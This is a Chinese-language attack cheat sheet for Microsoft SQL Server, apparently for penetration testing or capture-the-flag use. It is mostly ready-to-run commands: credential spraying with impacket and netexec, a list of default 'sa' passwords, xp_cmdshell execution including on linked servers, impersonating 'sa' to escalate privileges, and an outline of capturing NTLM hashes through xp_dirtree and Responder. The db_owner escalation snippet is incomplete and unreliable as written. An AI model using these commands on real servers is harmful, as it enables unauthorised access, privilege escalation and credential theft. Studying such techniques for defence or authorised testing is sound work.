# MSSQL 攻击详解

## 1. 连接与认证

```bash
# impacket（推荐）
impacket-mssqlclient sa:PASSWORD@TARGET
impacket-mssqlclient DOMAIN/user:PASSWORD@TARGET -windows-auth

# netexec 验证凭据
netexec mssql TARGET -u sa -p PASSWORD --local-auth
netexec mssql TARGET -u users.txt -p passwords.txt --local-auth

# sqsh（Linux 原生客户端）
sqsh -S TARGET -U sa -P PASSWORD
```

### 默认/弱口令
```
sa : (空)
sa : sa
sa : 123456
sa : Password1
sa : 1qaz@WSX
sa : admin@123
```

## 2. 命令执行

核心方法：xp_cmdshell 直接执行系统命令、OLE Automation 存储过程、SQL Server Agent Job 计划任务。

## 3. CLR Assembly 攻击

通过加载自定义 CLR Assembly 实现任意 .NET 代码执行，适用于 xp_cmdshell 被禁用的场景。

## 4. 文件读写

利用 OPENROWSET / BULK INSERT 读取文件，xp_cmdshell / OLE 写入文件。

## 5. 信息收集

```sql
-- 版本信息
SELECT @@version;
SELECT @@servername;

-- 当前用户和权限
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = sysadmin

-- 列出数据库
SELECT name FROM master.sys.databases;

-- 列出表
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- 搜索 flag
-- 遍历所有数据库搜索含 flag 字段的表
EXEC sp_MSforeachdb 'USE [?]; SELECT ''?'' AS db, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE ''%flag%''';

-- 链接服务器（横向移动）
SELECT * FROM sys.servers;
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

## 6. 提权

### 从 db_owner 到 sysadmin
```sql
-- 如果是 db_owner 但不是 sysadmin
USE msdb;  -- 或其他可信数据库
EXEC sp_addrolemember 'db_owner', 'PUBLIC';
-- 然后通过 trustworthy + db_owner 提权
```

### 模拟其他账户
```sql
-- 检查可模拟的登录
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

-- 模拟 sa
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
REVERT;
```

## 7. NTLM Hash 窃取

利用 xp_dirtree / xp_fileexist 等扩展存储过程触发 UNC 路径访问，配合 Responder 捕获 NTLM Hash。
